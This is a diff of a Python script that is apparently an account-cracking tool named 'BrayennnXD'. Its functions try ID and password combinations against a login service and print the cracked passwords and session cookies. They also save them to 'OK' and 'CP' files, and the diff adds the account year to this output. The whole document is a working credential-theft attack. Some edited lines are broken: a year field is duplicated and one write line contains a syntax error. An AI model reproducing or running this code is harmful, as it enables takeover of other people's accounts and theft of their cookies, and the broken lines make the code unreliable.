@@ -1870,7 +1870,7 @@ def validate1(idf,pwv):
 				elif 'ya' in gabriel:
 					cp+=1
 					print('\n')
-					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
+					statuscp = f'[•] ID       : {idf}\n[•] tahun : {cektahun}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
 					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
 					cetak(statuscp1)
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
@@ -1893,7 +1893,7 @@ def validate1(idf,pwv):
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print('\n')
-					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
+					statusok = f'[•] ID       : {idf}\n[•] tahun : {cektahun}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
 					cetak(statusok1)
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
@@ -1939,7 +1939,7 @@ def validate2(idf,pwv):
 				elif 'ya' in gabriel:
 					cp+=1
 					print('\n')
-					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
+					statuscp = f'[•] ID       : {idf}\n[•] tahun : {cektahun}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
 					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
 					cetak(statuscp1)
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
@@ -1952,7 +1952,7 @@ def validate2(idf,pwv):
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print('\n')
-					statusok = f'[•] ID       : {idf}\n[•] tahun : {cektahun}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
+					statusok = f'[•] ID       : {idf}\n[•] tahun : {cektahun}\n[•] tahun : {cektahun}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
 					cetak(statusok1)
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
@@ -1962,7 +1962,7 @@ def validate2(idf,pwv):
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print('\n')
-					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
+					statusok = f'[•] ID       : {idf}\n[•] tahun : {cektahun}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
 					cetak(statusok1)
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
@@ -2008,7 +2008,7 @@ def validate3(idf,pwv):
 				elif 'ya' in gabriel:
 					cp+=1
 					print('\n')
-					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
+					statuscp = f'[•] ID       : {idf}\n[•] tahun : {cektahun}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
 					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
 					cetak(statuscp1)
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
@@ -2021,7 +2021,7 @@ def validate3(idf,pwv):
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print('\n')
-					statusok = f'[•] ID       : {idf}\n[•] tahun : {cektahun}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
+					statusok = f'[•] ID       : {idf}\n[•] tahun : {cektahun}\n[•] tahun : {cektahun}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
 					cetak(statusok1)
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
@@ -2031,7 +2031,7 @@ def validate3(idf,pwv):
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print('\n')
-					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
+					statusok = f'[•] ID       : {idf}\n[•] tahun : {cektahun}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
 					cetak(statusok1)
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
@@ -2096,7 +2096,7 @@ def reguler1(idf,pwv):
 				elif 'ya' in gabriel:
 					cp+=1
 					print('\n')
-					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
+					statuscp = f'[•] ID       : {idf}\n[•] tahun : {cektahun}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
 					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
 					cetak(statuscp1)
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
@@ -2119,7 +2119,7 @@ def reguler1(idf,pwv):
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print('\n')
-					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
+					statusok = f'[•] ID       : {idf}\n[•] tahun : {cektahun}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
 					cetak(statusok1)
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
@@ -2195,7 +2195,7 @@ def reguler2(idf,pwv):
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print('\n')
-					statusok = f'[•] ID       : {idf}\n[•] tahun : {cektahun}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
+					statusok = f'[•] ID       : {idf}\n[•] tahun : {cektahun}\n[•] tahun : {cektahun}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
 					cetak(statusok1)
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
@@ -2205,7 +2205,7 @@ def reguler2(idf,pwv):
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print('\n')
-					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
+					statusok = f'[•] ID       : {idf}\n[•] tahun : {cektahun}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
 					cetak(statusok1)
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
@@ -2270,7 +2270,7 @@ def reguler3(idf,pwv):
 				elif 'ya' in gabriel:
 					cp+=1
 					print('\n')
-					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
+					statuscp = f'[•] ID       : {idf}\n[•] tahun : {cektahun}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
 					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
 					cetak(statuscp1)
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
@@ -2293,7 +2293,7 @@ def reguler3(idf,pwv):
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print('\n')
-					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
+					statusok = f'[•] ID       : {idf}\n[•] tahun : {cektahun}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
 					cetak(statusok1)
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
@@ -2359,7 +2359,7 @@ def kontol(idf,pwv):
 				elif 'ya' in gabriel:
 					cp+=1
 					print('\n')
-					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
+					statuscp = f'[•] ID       : {idf}\n[•] tahun : {cektahun}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
 					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
 					cetak(statuscp1)
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
@@ -2382,7 +2382,7 @@ def kontol(idf,pwv):
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print('\n')
-					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
+					statusok = f'[•] ID       : {idf}\n[•] tahun : {cektahun}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
 					cetak(statusok1)
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
@@ -2448,7 +2448,7 @@ def bapi(idf,pwv):
 				elif 'ya' in gabriel:
 					cp+=1
 					print('\n')
-					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
+					statuscp = f'[•] ID       : {idf}\n[•] tahun : {cektahun}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
 					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
 					cetak(statuscp1)
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
@@ -2471,7 +2471,7 @@ def bapi(idf,pwv):
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print('\n')
-					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
+					statusok = f'[•] ID       : {idf}\n[•] tahun : {cektahun}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
 					cetak(statusok1)
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
@@ -2518,7 +2518,7 @@ def colmek1(idf,pwv):
 				elif 'ya' in gabriel:
 					cp+=1
 					print('\n')
-					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
+					statuscp = f'[•] ID       : {idf}\n[•] tahun : {cektahun}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
 					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
 					cetak(statuscp1)
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
@@ -2541,7 +2541,7 @@ def colmek1(idf,pwv):
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print('\n')
-					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
+					statusok = f'[•] ID       : {idf}\n[•] tahun : {cektahun}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
 					cetak(statusok1)
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
@@ -2582,16 +2582,16 @@ def colmek2(idf,pwv):
 					statuscp = f'[•] ID       : {idf}\n[•] tahun : {cektahun}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
 					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
 					cetak(statuscp1)
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('CP/'+cpc,'a').write(cektahun+'|'+idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					break
 				elif 'ya' in gabriel:
 					cp+=1
 					print('\n')
-					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
+					statuscp = f'[•] ID       : {idf}\n[•] tahun : {cektahun}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
 					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
 					cetak(statuscp1)
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('CP/'+cpc,'a').write(cektahun+'|'+idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					ceker(idf,pw)
 					break
@@ -2604,17 +2604,17 @@ def colmek2(idf,pwv):
 					statusok = f'[•] ID       : {idf}\n[•] tahun : {cektahun}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
 					cetak(statusok1)
-					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('OK/'+okc,'a').write(cektahun+'|'+idf+'|'+pw+'|'+ua+'\n')
 					break
 				elif 'ya' in taplikasi:
 					ok+=1
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print('\n')
-					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
+					statusok = f'[•] ID       : {idf}\n[•] tahun : {cektahun}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
 					cetak(statusok1)
-					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('OK/'+okc,'a').write(cektahun+'|'idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
 					break
 				
